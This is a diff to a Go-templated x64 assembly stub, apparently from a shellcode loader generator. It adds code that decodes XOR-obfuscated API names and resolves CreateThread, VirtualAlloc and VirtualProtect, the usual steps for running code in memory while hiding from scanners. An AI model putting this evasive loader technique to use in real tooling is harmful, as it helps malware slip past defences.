@@ -10,7 +10,7 @@
 entry:
   // find CreateThread, VirtualAlloc and VirtualProtect
 {{if .LackProcedure}}
-  // push kernel32.dll\0 to stack
+  // push kernel32 module name to stack
   mov {{.Reg.rax}}, {{index .Kernel32DLLDB 0}}
   mov {{.Reg.r8}},  {{index .Kernel32DLLKey 0}}
   xor {{.Reg.rax}}, {{.Reg.r8}}
@@ -52,7 +52,7 @@ entry:
   // store the handle of kernel32.dll
   mov {{.RegS.r11}}, rax
 
-  // restore stack for "kernel32.dll"
+  // restore stack for kernel32 module name
   {{if .LoadLibraryWOnly}}
     add rsp, 4*8
   {{else}}
@@ -64,7 +64,7 @@ entry:
   add {{.Reg.rax}}, {{hex .GetProcAddress}}
   mov {{.RegS.r12}}, [{{.Reg.rax}}]
 
-  // get the procedure address
+  // get procedure address of CreateThread
   {{if .LackCreateThread}}
 
   {{else}}
@@ -73,6 +73,7 @@ entry:
     mov {{.RegS.r13}}, [{{.Reg.rbx}}]
   {{end}}
 
+  // get procedure address of VirtualAlloc
   {{if .LackVirtualAlloc}}
 
   {{else}}
@@ -81,8 +82,27 @@ entry:
     mov {{.RegS.r14}}, [{{.Reg.rcx}}]
   {{end}}
 
+  // get procedure address of VirtualProtect
   {{if .LackVirtualProtect}}
+    // push procedure name to stack
+    mov {{.Reg.rax}}, {{index .VirtualProtectDB 0}}
+    mov {{.Reg.r8}},  {{index .VirtualProtectKey 0}}
+    xor {{.Reg.rax}}, {{.Reg.r8}}
+    push {{.Reg.rax}}
+    mov {{.Reg.rbx}}, {{index .VirtualProtectDB 1}}
+    mov {{.Reg.r9}},  {{index .VirtualProtectKey 1}}
+    xor {{.Reg.rbx}}, {{.Reg.r9}}
+    push {{.Reg.rbx}}
 
+    // call GetProcAddress
+    mov rcx, rsp
+    sub rsp, 0x20
+    call {{.RegS.r12}}
+    add rsp, 0x20
+    mov {{.RegS.r15}}, rax
+
+    // restore stack for procedure name
+    add rsp, 2*8
   {{else}}
     mov {{.Reg.rdx}}, {{.RegS.r10}}
     add {{.Reg.rdx}}, {{hex .VirtualProtect}}
@@ -97,6 +117,18 @@ entry:
   // store image base address
   mov {{.RegS.r10}}, [{{.Reg.rbx}} + 0x10]
 
+  // get procedure address of CreateThread
+  mov {{.Reg.rbx}}, {{.RegS.r10}}
+  add {{.Reg.rbx}}, {{hex .CreateThread}}
+  mov {{.RegS.r13}}, [{{.Reg.rbx}}]
+  // get procedure address of VirtualAlloc
+  mov {{.Reg.rcx}}, {{.RegS.r10}}
+  add {{.Reg.rcx}}, {{hex .VirtualAlloc}}
+  mov {{.RegS.r14}}, [{{.Reg.rcx}}]
+  // get procedure address of VirtualProtect
+  mov {{.Reg.rdx}}, {{.RegS.r10}}
+  add {{.Reg.rdx}}, {{hex .VirtualProtect}}
+  mov {{.RegS.r15}}, [{{.Reg.rdx}}]
 {{end}}
 
   int3
